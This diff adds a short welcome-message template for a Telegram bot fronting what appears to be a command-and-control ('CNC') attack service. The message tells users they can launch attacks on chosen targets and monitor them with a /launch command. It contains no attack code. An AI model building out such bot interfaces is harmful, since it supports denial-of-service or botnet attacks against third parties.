@@ -1,0 +1,5 @@
+Salutations, `<<user.$username>>`! Welcome To The *<<cnc()>>* Telegram bot.
+
+Welcome to our Telegram bot! As a user with the bot role, you can launch attacks and monitor your ongoing attacks. Remember, these actions are accessible only to users with the bot role. Enjoy!
+
+Use the command /launch to initiate an attack on a specific target using a chosen method.
